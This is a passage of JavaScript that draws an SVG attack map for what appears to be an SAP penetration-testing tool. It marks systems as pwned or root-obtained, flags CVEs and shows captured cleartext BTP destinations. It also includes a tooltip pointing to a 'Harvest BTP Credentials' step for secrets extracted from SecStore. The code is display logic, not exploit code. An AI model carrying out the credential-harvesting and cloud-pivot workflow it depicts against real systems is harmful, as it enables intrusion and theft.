      // Perpendicular based on canonical direction (consistent for both A→B and B→A)
      const px = -cdy / len, py = cdx / len;
      const offset = (idx - (total - 1) / 2) * 40;
      const qx = mx + px * offset, qy = my + py * offset;
      html += `<path class="edge-line" d="M${x1},${y1} Q${qx},${qy} ${x2},${y2}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-end="url(#arrow-${ci})" data-conn-idx="${ci}" ` +
        `onclick="showConnInfo(event, ${ci})" />`;
    }

    // Connection label at midpoint
    const mx2 = (x1 + x2) / 2, my2 = (y1 + y2) / 2;
    let lx = mx2, ly = my2 - 6;
    if (total > 1) {
      const cdx2 = a < b ? (cx2 - cx1) : (cx1 - cx2);
      const cdy2 = a < b ? (cy2 - cy1) : (cy1 - cy2);
      const len2 = Math.sqrt(cdx2*cdx2 + cdy2*cdy2) || 1;
      const px2 = -cdy2 / len2, py2 = cdx2 / len2;
      const off2 = (idx - (total - 1) / 2) * 40;
      // Place label at quadratic bezier midpoint (t=0.5)
      lx = mx2 + px2 * off2 * 0.5;
      ly = my2 + py2 * off2 * 0.5 - 6;
    }
    let label = conn.destination_name || '';
    if (conn.rfc_user) label += ' / ' + conn.rfc_user;
    if (conn.has_sap_all) label += ' (SAP_ALL)';
    html += `<text x="${lx}" y="${ly}" text-anchor="middle" font-size="10" ` +
      `fill="#8b949e" font-family="monospace" pointer-events="none">${escHtml(label)}</text>`;
  });

  // --- SCC → SAP-node edges (Cloud Connector tunnel mappings) ---
  Object.keys(nodes).forEach(sid => {
    const n = nodes[sid];
    const links = n.scc_links || [];
    if (!links.length) return;
    const tx = (n._x || 0) + BOX_W / 2, ty = (n._y || 0) + BOX_H / 2;
    links.forEach(sccHost => {
      const sn = (mapState.scc_nodes || {})[sccHost];
      if (!sn) return;
      const sx = (sn._x || 0) + BOX_W / 2, sy = (sn._y || 0) + BOX_H / 2;
      // List the mappings between this SCC and this SAP node.
      // Mapping-level SID is authoritative (a single IP often hosts
      // multiple SIDs); host/ip only used as fallback when SID is empty.
      const matches = (sn.mappings || []).filter(m => {
        if (!m) return false;
        const msid = (m.sid || '').toUpperCase();
        if (msid) return msid === (n.sid || '').toUpperCase();
        const ih = m.internal_host || '';
        return ih === n.hostname || ih === n.ip;
      });
      if (!matches.length) return;
      const ppHi = matches.some(m => m.principal_propagation);
      // Reachability tally — derived from sapmap_scc_relay probe results.
      const probed = matches.filter(m => m.reachable === true || m.reachable === false);
      const reachOk = matches.filter(m => m.reachable === true).length;
      const reachBad = matches.filter(m => m.reachable === false).length;
      const allProbed = probed.length === matches.length;
      // Color priority: red (any unreachable) > green (all reach probed OK) > orange (PP, not yet probed) > teal (default).
      // Reach is the more actionable signal once probed, so it wins over
      // the PP highlight; PP is still surfaced via the [PP] label badge
      // and the drawer Auth column.
      let stroke, labelColor;
      if (reachBad > 0)                       { stroke = '#f85149'; labelColor = '#f85149'; }
      else if (allProbed && reachOk)          { stroke = '#3fb950'; labelColor = '#3fb950'; }
      else if (ppHi)                          { stroke = '#f0883e'; labelColor = '#f0883e'; }
      else                                    { stroke = '#046c7a'; labelColor = '#9bb1c4'; }
      const width = (ppHi || reachBad > 0 || (allProbed && reachOk)) ? 3 : 2;
      // Bundled-with-badge: one line per (SCC, SAP) pair regardless of how
      // many mappings traverse it.  Label shows mapping count and (when
      // probed) a reach badge "X/Y reach".
      const baseLabel = matches.length === 1
        ? `${matches[0].virtual_host}:${matches[0].virtual_port} → ${matches[0].internal_host}:${matches[0].internal_port}`
        : `${matches.length} mappings`;
      const reachBadge = probed.length > 0
        ? ` · ${reachOk}/${matches.length} reach`
        : '';
      const ppBadge = ppHi ? ' [PP]' : '';
      html += `<line class="edge-line" x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" ` +
        `stroke="${stroke}" stroke-width="${width}" stroke-dasharray="6,4" fill="none" ` +
        `pointer-events="none" />`;
      const mx = (sx + tx) / 2, my = (sy + ty) / 2;
      html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
        `fill="${labelColor}" font-family="monospace" pointer-events="none">SCC: ${escHtml(baseLabel)}${reachBadge}${ppBadge}</text>`;
    });
  });

  // --- SCC ↔ BTP-subaccount edges (Cloud Connector → cloud tunnel) ---
  // SCCNode.subaccount_uuids is authoritative; fall back to
  // BTPSubaccountNode.scc_locations[].scc_host_uuid matching the SCC host.
  Object.keys(sccNodes).forEach(host => {
    const sn = sccNodes[host];
    const sccUuids = (sn.subaccount_uuids || []).map(u => (u || '').toLowerCase());
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      const uuidLc = (uuid || '').toLowerCase();
      let matched = sccUuids.includes(uuidLc);
      let locId = '';
      if (!matched) {
        const locs = bn.scc_locations || [];
        for (const loc of locs) {
          const sh = ((loc && loc.scc_host_uuid) || '').toLowerCase();
          if (sh && (sh === host.toLowerCase() || sh === (sn.host || '').toLowerCase())) {
            matched = true;
            locId = loc.location_id || '';
            break;
          }
        }
      }
      if (!matched) return;
      const sx = (sn._x || 0) + BOX_W / 2;
      const sy = (sn._y || 0) + BOX_H / 2;
      const tx = (bn._x || 0) + BOX_W / 2;
      const ty = (bn._y || 0) + BOX_H / 2;
      html += `<line class="edge-line" x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" ` +
        `stroke="#5dade2" stroke-width="2.5" stroke-dasharray="4,4" fill="none" ` +
        `pointer-events="none" />`;
      const mx = (sx + tx) / 2, my = (sy + ty) / 2;
      const lbl = locId ? `SCC tunnel: ${locId}` : 'SCC tunnel';
      html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
        `fill="#5dade2" font-family="monospace" pointer-events="none">${escHtml(lbl)}</text>`;
    });
  });

  // --- SCC HA shadow links (master ↔ shadow) ---
  // Draw once per pair: only emit from the host with the lexicographically
  // smaller name to avoid duplicate overlapping segments.
  const drawnHA = {};
  Object.keys(sccNodes).forEach(host => {
    const sn = sccNodes[host];
    const peer = sn.ha_shadow_host || '';
    if (!peer) return;
    const pn = sccNodes[peer];
    if (!pn) return;
    const pairKey = [host, peer].sort().join('|');
    if (drawnHA[pairKey]) return;
    drawnHA[pairKey] = true;
    const ax = (sn._x || 0) + BOX_W / 2, ay = (sn._y || 0) + BOX_H / 2;
    const bx = (pn._x || 0) + BOX_W / 2, by = (pn._y || 0) + BOX_H / 2;
    // Solid violet line — distinct from the teal/orange/red SCC→SAP edges.
    html += `<line class="edge-line" x1="${ax}" y1="${ay}" x2="${bx}" y2="${by}" ` +
      `stroke="#a371f7" stroke-width="2" stroke-dasharray="2,3" fill="none" pointer-events="none" />`;
    const mx = (ax + bx) / 2, my = (ay + by) / 2;
    const roleA = (sn.ha_role || '?').toUpperCase();
    const roleB = (pn.ha_role || sn.ha_peer_role || '?').toUpperCase();
    html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
      `fill="#a371f7" font-family="monospace" pointer-events="none">HA: ${escHtml(roleA)} ⇄ ${escHtml(roleB)}</text>`;
  });

  // Draw nodes
  nodeKeys.forEach(sid => {
    const n = nodes[sid];
    const x = n._x || 0, y = n._y || 0;
    const isScanning = !!(activeTasks[sid + ':retrieve_rfcs']);
    // Track new nodes for fade-in (persists across re-renders)
    if (!firstRender && !prevNodes.has(sid) && !fadingNodes[sid]) {
      fadingNodes[sid] = { start: Date.now(), duration: 5000 };
    }
    const fadeInfo = fadingNodes[sid];
    const isFading = !!fadeInfo;
    let nodeOpacity = 1;
    if (isFading) {
      const elapsed = Date.now() - fadeInfo.start;
      nodeOpacity = Math.min(1, elapsed / fadeInfo.duration);
      if (nodeOpacity >= 1) delete fadingNodes[sid]; // done fading
    }

    // Determine colors
    let fill = '#16213e';
    let borderColor = '#2ecc71';
    let borderWidth = 4;
    // BTP-discovery placeholder: muted fill + dashed amber border so
    // operators can tell at a glance which nodes came from a BTP
    // destination but haven't been independently scanned yet.
    const isBtpDiscovered = !!n.discovered_via_btp;
    let nodeDash = '';
    if (isBtpDiscovered) {
      fill = '#1f2333';
      borderColor = '#a371f7';
      borderWidth = 3;
      nodeDash = ' stroke-dasharray="8,5"';
    }

    if (n.is_production) fill = '#4a1a1a';
    else if (Object.keys(n.clients || {}).length > 0) fill = '#4a3a1a';

    if (n.has_critical_finding || n.gw_vulnerable || n.ms_vulnerable || n.cve_2025_31324_vulnerable || n.cve_2020_6287_vulnerable) { borderColor = '#8b0000'; borderWidth = 6; }

    // Scanning radar pulse + probe lines (behind node)
    if (isScanning) {
      const pcx = x + BOX_W/2, pcy = y + BOX_H/2;
      // Radar pulse ring
      html += `<circle cx="${pcx}" cy="${pcy}" fill="none" stroke="#f0883e" stroke-width="2">` +
        `<animate attributeName="r" from="20" to="160" dur="1.2s" fill="freeze" />` +
        `<animate attributeName="opacity" from="0.5" to="0" dur="1.2s" fill="freeze" />` +
        `</circle>`;
      // Fake probe lines shooting out in random directions (styled like RFC connections)
      const probeCount = 5 + Math.floor(Math.random() * 3);
      for (let p = 0; p < probeCount; p++) {
        const angle = Math.random() * Math.PI * 2;
        const dist = 150 + Math.random() * 250;
        const ex = pcx + Math.cos(angle) * dist;
        const ey = pcy + Math.sin(angle) * dist;
        const dur = (0.5 + Math.random() * 0.4).toFixed(2);
        html += `<line x1="${pcx}" y1="${pcy}" x2="${ex}" y2="${ey}" ` +
          `stroke="#5dade2" stroke-width="4">` +
          `<animate attributeName="opacity" values="0;0.6;0" dur="${dur}s" repeatCount="indefinite" />` +
          `</line>`;
      }
    }

    // Node group
    html += `<g class="node-box" data-sid="${sid}" ${isFading ? `opacity="${nodeOpacity.toFixed(2)}"` : ''} ` +
      `onmousedown="startDrag(event,'${sid}')" ` +
      `oncontextmenu="showCtxMenu(event,'${sid}')" >`;

    // Box
    html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="${BOX_H}" ` +
      `rx="6" fill="${fill}" stroke="${borderColor}" stroke-width="${borderWidth}"${nodeDash} />`;
    if (isBtpDiscovered) {
      // Tiny "via BTP" tag in the top-right corner so the dashed
      // border isn't the only visual signal.
      html += `<text x="${x+BOX_W-8}" y="${y+18}" text-anchor="end" ` +
        `font-size="10" fill="#a371f7" font-family="monospace" ` +
        `font-weight="bold">via BTP</text>`;
    }

    // Header band
    html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="28" rx="6" fill="${borderColor}" opacity="0.25" />`;

    // SID
    html += `<text x="${x+10}" y="${y+18}" fill="#fff" font-size="13" ` +
      `font-weight="bold" font-family="monospace">${escHtml(n.sid || sid)}</text>`;

    // System type pill
    const stype = (n.system_type || '').toUpperCase();
    const pillColor = PILL_COLORS[stype] || '#788fa6';
    const pillLabel = PILL_LABELS[stype] || stype;
    if (pillLabel) {
      const px = x + 10 + (n.sid || sid).length * 8 + 8;
      if (stype === 'ABAP+JAVA') {
        html += `<rect x="${px}" y="${y+4}" width="58" height="18" rx="9" fill="#0070f2" />`;
        html += `<rect x="${px+28}" y="${y+4}" width="30" height="18" rx="9" fill="#d27700" />`;
        html += `<text x="${px+29}" y="${y+16}" text-anchor="middle" font-size="8" fill="#fff" font-weight="bold">${pillLabel}</text>`;
      } else {
        html += `<rect x="${px}" y="${y+4}" width="${pillLabel.length*7+12}" height="18" rx="9" fill="${pillColor}" />`;
        html += `<text x="${px + (pillLabel.length*7+12)/2}" y="${y+16}" text-anchor="middle" font-size="9" fill="#fff" font-weight="bold">${escHtml(pillLabel)}</text>`;
      }

      // DB pill
      const dbType = (n.db_type || '').toUpperCase();
      const dbPillColor = PILL_COLORS[dbType];
      const dbPillLabel = PILL_LABELS[dbType];
      if (dbPillColor && dbPillLabel) {
        const dpx = px + (pillLabel.length*7+12) + 6;
        html += `<rect x="${dpx}" y="${y+4}" width="${dbPillLabel.length*7+10}" height="18" rx="9" fill="${dbPillColor}" />`;
        html += `<text x="${dpx + (dbPillLabel.length*7+10)/2}" y="${y+16}" text-anchor="middle" font-size="8" fill="#fff" font-weight="bold">${escHtml(dbPillLabel)}</text>`;
      }
    }

    // Lightning bolt for pwned — sits in the top-right corner, partly
    // outside the box (mirror of the finding badge in the top-left).
    if (n.pwned) {
      const lx = x + BOX_W + 2, ly = y - 2;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
        + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
        + ` text-anchor="middle" dominant-baseline="middle"`
        + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }
    // Root badge — shown when EITHER Copy Fail or Dirty Frag has
    // obtained root on this host.
    if (n.copyfail_root_obtained || n.dirtyfrag_root_obtained) {
      html += `<text x="${x+BOX_W-30}" y="${y-2}" font-size="22" fill="#e6edf3"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9650;</text>`;
    }

    // Finding badge — count of unresolved (undismissed) CRITICAL/HIGH
    // for this SID.  Renders as a small numbered dot in the top-left
    // corner so it doesn't fight the pwned bolt in the top-right.
    const fCount = _nodeFindingCount(sid);
    if (fCount.count > 0) {
      const fill = fCount.worst === 'CRITICAL' ? '#e74c3c'
                 : fCount.worst === 'HIGH'     ? '#f0883e'
                 : fCount.worst === 'MEDIUM'   ? '#d29922'
                 :                                '#388bfd';
      // Nudge the badge outside the top-left corner (half above / half
      // left) so it doesn't cover the SID text inside the box.
      const bx = x - 4, by = y - 4;
      html += `<circle cx="${bx}" cy="${by}" r="8" fill="${fill}"`
        + ` stroke="#0d1117" stroke-width="1.5">`
        + `<title>${fCount.count} unresolved finding(s) · worst: `
        + `${fCount.worst}</title></circle>`
        + `<text x="${bx}" y="${by+3}" font-size="10" fill="#fff"`
        + ` text-anchor="middle" font-weight="700" font-family="monospace"`
        + ` pointer-events="none">${fCount.count}</text>`;
    }

    // Activity spinner for active background tasks
    if (_nodeHasActiveTask(sid)) {
      const cx = x + BOX_W - 18;
      html += `<circle cx="${cx}" cy="${y+14}" r="6" fill="none" stroke="#f0883e" stroke-width="2" stroke-dasharray="20 12" stroke-linecap="round">` +
        `<animateTransform attributeName="transform" type="rotate" from="0 ${cx} ${y+14}" to="360 ${cx} ${y+14}" dur="1s" repeatCount="indefinite" /></circle>`;
    }

    // Instance info
    let ty = y + 38;
    const instances = n.instances || [];
    const instNrs = instances.map(i => i.instance_nr).filter(i => i !== 'XX').sort();
    if (instNrs.length > 0) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Inst: ${escHtml(instNrs.join(', '))}</text>`;
      ty += 14;
    }

    // Hostname
    if (n.hostname) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Host: ${escHtml(n.hostname)}</text>`;
      ty += 14;
    }

    // IP address
    if (n.ip) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">IP: ${escHtml(n.ip)}</text>`;
      ty += 14;
    }

    // SAProuter indicator
    if (n.saprouter) {
      html += `<text x="${x+10}" y="${ty}" fill="#d29922" font-size="9" font-family="monospace">&#128268; via SAProuter</text>`;
      ty += 14;
    }

    // OS
    if (n.os_type) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">OS: ${escHtml(n.os_type)}</text>`;
      ty += 14;
    }

    // DB type
    if (n.db_type) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">DB: ${escHtml(n.db_type)}</text>`;
      ty += 14;
    }

    // Clients
    const clients = n.clients || [];
    if (clients.length > 0) {
      const clientStr = clients.slice(0, 6).map(c => typeof c === 'object' ? (c.nr||'?') : String(c)).join(', ') +
        (clients.length > 6 ? ` (+${clients.length-6})` : '');
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Clients: ${escHtml(clientStr)}</text>`;
      ty += 14;
    }

    // Open ports (collected from all instances) — truncate to fit box
    const allPorts = new Set();
    for (const inst of (n.instances || [])) {
      for (const p of Object.keys(inst.ports || {})) allPorts.add(parseInt(p));
    }
    if (allPorts.size > 0) {
      const sorted = [...allPorts].sort((a,b) => a-b);
      let portStr = '';
      for (const p of sorted) {
        const next = portStr ? ', ' + p : String(p);
        if (portStr.length + next.length > 30) { portStr += '...'; break; }
        portStr += next;
      }
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Ports: ${escHtml(portStr)}</text>`;
      ty += 14;
    }

    // PRD indicator bar
    if (n.is_production) {
      html += `<rect x="${x+10}" y="${y+BOX_H-28}" width="${BOX_W-20}" height="8" rx="4" fill="#8b0000" opacity="0.7" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-32}" text-anchor="middle" font-size="9" fill="#f85149" font-weight="bold">PRD</text>`;
    } else if (clients.length > 0) {
      const rolesKnown = clients.some(c => typeof c === 'object' && c.category);
      const barLabel = rolesKnown ? 'Non-PRD' : 'Clients found — roles unknown';
      html += `<rect x="${x+10}" y="${y+BOX_H-28}" width="${BOX_W-20}" height="8" rx="4" fill="#e67e22" opacity="0.4" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-32}" text-anchor="middle" font-size="8" fill="#e67e22" opacity="0.7">${barLabel}</text>`;
    }

    // Business impact badge row (small icons for each finding)
    const impactResults = (n.impact_results || []).filter(r => r.record_count > 0);
    if (impactResults.length > 0) {
      const maxImpSev = Math.max(...impactResults.map(r => r.severity || 1));
      const impColor = maxImpSev >= 5 ? '#e74c3c' : maxImpSev >= 4 ? '#e67e22' : '#d29922';
      // Impact bar at the bottom of the box
      html += `<rect x="${x+10}" y="${y+BOX_H-14}" width="${BOX_W-20}" height="10" rx="3" fill="${impColor}" opacity="0.2" />`;
      // Show scenario icons (up to 6)
      const icons = impactResults.slice(0, 6).map(r => r.icon || '?');
      const iconStr = icons.join(' ');
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-6}" text-anchor="middle" font-size="9" fill="${impColor}" opacity="0.9">${iconStr} ${impactResults.length} impacts</text>`;
    }

    // Finding count badge — matches the vulnerability rows shown in the System Details panel
    const isJava = (n.system_type || '').toUpperCase().indexOf('JAVA') !== -1;
    let vulnCount = 0;
    if (n.gw_vulnerable) vulnCount++;
    if (n.ms_vulnerable) vulnCount++;
    if (isJava && n.cve_2025_31324_vulnerable) vulnCount++;
    if (isJava && n.cve_2020_6287_vulnerable) vulnCount++;
    if (vulnCount > 0) {
      // All of these map to critical severity (5)
      const badgeColor = '#da3633';
      html += `<circle cx="${x+BOX_W-14}" cy="${y+BOX_H-14}" r="11" fill="${badgeColor}" />`;
      html += `<text x="${x+BOX_W-14}" y="${y+BOX_H-10}" text-anchor="middle" font-size="10" fill="#fff">${vulnCount}</text>`;
    }

    // BTP-pivot hint: when SecStore extraction recovered an OAuth
    // 2.0 client_secret (/OA2C/CS_<UUID>_NN row), surface a small
    // cloud icon in the bottom-left corner so the operator notices
    // the system has unexploited cloud-pivot material — even when
    // the harvest hasn't been kicked off yet.  Hover for the next
    // step.
    const _hasOauthSecret = (n.secstore_entries || []).some(
      e => e && e.category === 'oauth2_client');
    if (_hasOauthSecret) {
      const cx = x + 18, cy = y + BOX_H - 14;
      html += `<g pointer-events="all" style="cursor:help">`
           + `<title>OAuth 2.0 client_secret in SecStore — choose `
           + `Exploitation → Harvest BTP Credentials to read `
           + `destinations from connected BTP tenants</title>`
           + `<circle cx="${cx}" cy="${cy}" r="11" fill="#0e2636" `
           + `stroke="#a371f7" stroke-width="1.5" />`
           + `<text x="${cx}" y="${cy+5}" text-anchor="middle" `
           + `font-size="14" fill="#a371f7" pointer-events="none">`
           + `&#9729;</text>`
           + `</g>`;
    }

    html += '</g>';
  });

  // --- Draw SAP Cloud Connector nodes (hexagonal frame, distinct teal fill) ---
  sccKeys.forEach(host => {
    const sn = sccNodes[host];
    const x = sn._x || 0, y = sn._y || 0;
    const dragId = 'scc:' + host.replace(/'/g, "\\'");
    const sccFill = '#0d2a2e';        // dark teal-tinted fill
    const sccStroke = '#046c7a';      // matches CLOUD_CONNECTOR pill
    const cveCount = ((sn.cves_confirmed || []).length + (sn.cves_suspected || []).length);
    const borderC = sn.pwned ? '#8b0000' : (cveCount > 0 ? '#d29922' : sccStroke);
    const borderW = sn.pwned ? 6 : 4;

    html += `<g class="node-box" data-host="${escHtml(host)}" `
         + `onmousedown="startDrag(event,'${dragId}')" `
         + `oncontextmenu="showSCCCtxMenu(event,'${escHtml(host)}')" `
         + `onclick="showSCCDetail('${escHtml(host)}')">`;

    // Hexagon path — flat-top hex inscribed in BOX_W x BOX_H
    const hx = x, hy = y, hw = BOX_W, hh = BOX_H;
    const cut = 22;  // hex shoulder cut
    const hex = `M${hx+cut},${hy} L${hx+hw-cut},${hy} L${hx+hw},${hy+hh/2} `
              + `L${hx+hw-cut},${hy+hh} L${hx+cut},${hy+hh} L${hx},${hy+hh/2} Z`;
    html += `<path d="${hex}" fill="${sccFill}" stroke="${borderC}" stroke-width="${borderW}" />`;

    // Header band
    html += `<rect x="${x+cut-2}" y="${y}" width="${hw - 2*(cut-2)}" height="26" fill="${sccStroke}" opacity="0.35" />`;

    // Title — "SCC" label only (host moves into body like SAP nodes)
    html += `<text x="${x+cut+4}" y="${y+18}" fill="#fff" font-size="13" font-weight="bold" font-family="monospace">SCC</text>`;

    // Pwned bolt (top-right, mirroring SAP nodes)
    if (sn.pwned) {
      const lx = x + BOX_W + 2, ly = y - 2;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }

    // Body lines — host first (IP or hostname), then details
    let ty = y + 42;
    html += `<text x="${x+cut+4}" y="${ty}" fill="#cfd9df" font-size="11" font-weight="bold" font-family="monospace">${escHtml(host)}</text>`;
    ty += 16;
    if (sn.version) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Version: ${escHtml(sn.version)} (${escHtml(sn.version_source || '?')})</text>`;
      ty += 14;
    }
    if (sn.server_header) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Server: ${escHtml(sn.server_header.slice(0, 26))}</text>`;
      ty += 14;
    }
    if (sn.tls_fingerprint && sn.tls_fingerprint.tls_version) {
      const tv = sn.tls_fingerprint.tls_version;
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">TLS: ${escHtml(tv)}</text>`;
      ty += 14;
    }
    if (sn.bundle_hash) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#6e7681" font-size="9" font-family="monospace">bundle: ${escHtml(sn.bundle_hash.slice(0, 14))}</text>`;
      ty += 14;
    }
    html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Port: ${sn.admin_ui_port || 8443}</text>`;
    ty += 14;

    // CVE / status badge — bottom-right inside hex
    if (cveCount > 0) {
      const badgeColor = sn.pwned ? '#e74c3c' : '#d29922';
      html += `<circle cx="${x+BOX_W-cut-6}" cy="${y+BOX_H-14}" r="10" fill="${badgeColor}" />`;
      html += `<text x="${x+BOX_W-cut-6}" y="${y+BOX_H-10}" text-anchor="middle" font-size="10" fill="#fff" font-weight="bold">${cveCount}</text>`;
    }

    html += '</g>';
  });

  // --- Draw BTP subaccount nodes (cloud silhouette, sky-blue tint) ---
  btpKeys.forEach(uuid => {
    const bn = btpNodes[uuid];
    const x = bn._x || 0, y = bn._y || 0;
    const dragId = 'btp:' + uuid.replace(/'/g, "\\'");
    const btpFill = '#0e2636';        // dark navy fill
    const btpStroke = '#5dade2';      // sky-blue
    const dests = (bn.destinations || []);
    const cleartextCount = dests.filter(d => d && d.cleartext_captured).length;
    const linkedCount = dests.filter(d => d && d.linked_target_sid).length;
    const borderC = bn.pwned ? '#8b0000' : (cleartextCount > 0 ? '#d29922' : btpStroke);
    const borderW = bn.pwned ? 6 : 4;

    html += `<g class="node-box" data-btp="${escHtml(uuid)}" `
         + `onmousedown="startDrag(event,'${dragId}')" `
         + `onclick="showBTPDetail('${escHtml(uuid)}')" `
         + `oncontextmenu="showBTPCtxMenu(event,'${escHtml(uuid)}')">`;

    // Cloud silhouette: three humps on top, flat-ish bottom.
    // Sized to fit BOX_W (240) x BOX_H (174) with a bit of padding.
    const cloud = `M${x+30},${y+55} `
                + `C${x+10},${y+55} ${x+10},${y+25} ${x+45},${y+30} `
                + `C${x+50},${y+5} ${x+95},${y+5} ${x+105},${y+30} `
                + `C${x+115},${y+10} ${x+160},${y+10} ${x+170},${y+35} `
                + `C${x+205},${y+30} ${x+235},${y+45} ${x+225},${y+70} `
                + `C${x+240},${y+95} ${x+220},${y+125} ${x+195},${y+118} `
                + `L${x+45},${y+118} `
                + `C${x+15},${y+125} ${x+0},${y+95} ${x+18},${y+78} `
                + `C${x+5},${y+65} ${x+15},${y+50} ${x+30},${y+55} Z`;
    html += `<path d="${cloud}" fill="${btpFill}" stroke="${borderC}" stroke-width="${borderW}" />`;

    // Header band ("BTP" label + cloud glyph)
    html += `<text x="${x+BOX_W/2}" y="${y+50}" text-anchor="middle" `
         + `fill="#5dade2" font-size="14" font-weight="bold" `
         + `font-family="monospace" pointer-events="none">&#9729; BTP</text>`;

    // Pwned bolt (top-right)
    if (bn.pwned) {
      const lx = x + BOX_W - 10, ly = y + 18;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }

    // Body lines — region / subdomain / counts
    const subLabel = bn.display_name || bn.subdomain || uuid.slice(0, 8);
    let ty = y + 75;
    html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#cfd9df" `
         + `font-size="11" font-weight="bold" font-family="monospace">`
         + `${escHtml(subLabel.slice(0, 28))}</text>`;
    ty += 14;
    if (bn.region) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
           + `font-size="10" font-family="monospace">Region: ${escHtml(bn.region)}</text>`;
      ty += 13;
    }
    if (bn.subdomain && bn.subdomain !== subLabel) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
           + `font-size="10" font-family="monospace">${escHtml(bn.subdomain.slice(0, 28))}</text>`;
      ty += 13;
    }
    html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
         + `font-size="10" font-family="monospace">`
         + `Destinations: ${dests.length}</text>`;
    ty += 13;
    if (cleartextCount > 0) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#e74c3c" `
           + `font-size="10" font-weight="bold" font-family="monospace">`
           + `Cleartext: ${cleartextCount}${linkedCount ? ' (' + linkedCount + ' linked)' : ''}</text>`;
      ty += 13;
    }

    // Critical-finding badge
    if (cleartextCount > 0) {
      const badgeColor = bn.pwned ? '#e74c3c' : '#d29922';
      html += `<circle cx="${x+BOX_W-30}" cy="${y+BOX_H-30}" r="10" fill="${badgeColor}" />`;
      html += `<text x="${x+BOX_W-30}" y="${y+BOX_H-26}" text-anchor="middle" `
           + `font-size="10" fill="#fff" font-weight="bold">${cleartextCount}</text>`;
    }

    html += '</g>';
  });

  // Draw unknown target boxes (dashed border, dimmed)
  if (showUnknown) {
    for (const key in unknownTargets) {
      const ut = unknownTargets[key];
      const x = ut._x || 0, y = ut._y || 0;
      const unkId = 'unk:' + key.replace(/'/g, "\\'");
      html += `<g class="node-box" onmousedown="startDrag(event,'${unkId}')">`;
      html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="${BOX_H}" rx="6" fill="#1a1a2e" stroke="#484f58" stroke-width="3" stroke-dasharray="8,4" />`;
      html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="28" rx="6" fill="#484f58" opacity="0.2" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+18}" fill="#484f58" font-size="11" font-weight="bold" font-family="monospace" text-anchor="middle">UNKNOWN TARGET</text>`;
      html += `<text x="${x+10}" y="${y+48}" fill="#6e7681" font-size="10" font-family="monospace">Host: ${escHtml(ut.label)}</text>`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H/2+10}" fill="#484f58" font-size="20" text-anchor="middle">?</text>`;
      html += '</g>';
    }
  }

  // Chain highlight overlay: draw glowing path + hop badges
  if (_highlightedChain && _highlightedChain.length >= 2) {
    const BOX_W_h = 240, BOX_H_h = 174;
    // Resolve chain SIDs against on-prem nodes AND BTP subaccounts.
    // BTP-rooted chains start with a "BTP:<uuid8>" sentinel that
    // doesn't exist in mapState.nodes — without this branch the
    // highlight loop bailed silently and "Click to highlight on
    // map" looked broken.
    const _resolveChainSid = (sid) => {
      if (!sid) return null;
      if (nodes[sid]) return nodes[sid];
      if (sid.startsWith('BTP:')) {
        const suffix = sid.slice(4).toLowerCase();
        for (const u in btpNodes) {
          if (u.toLowerCase().startsWith(suffix)) return btpNodes[u];
        }
      }
      return null;
    };
    // Draw glowing edges between consecutive nodes in the chain
    for (let i = 0; i < _highlightedChain.length - 1; i++) {
      const srcSid = _highlightedChain[i];
      const tgtSid = _highlightedChain[i + 1];
      const srcN = _resolveChainSid(srcSid);
      const tgtN = _resolveChainSid(tgtSid);
      if (!srcN || !tgtN) continue;
      const sx = (srcN._x||0) + BOX_W_h/2, sy = (srcN._y||0) + BOX_H_h/2;
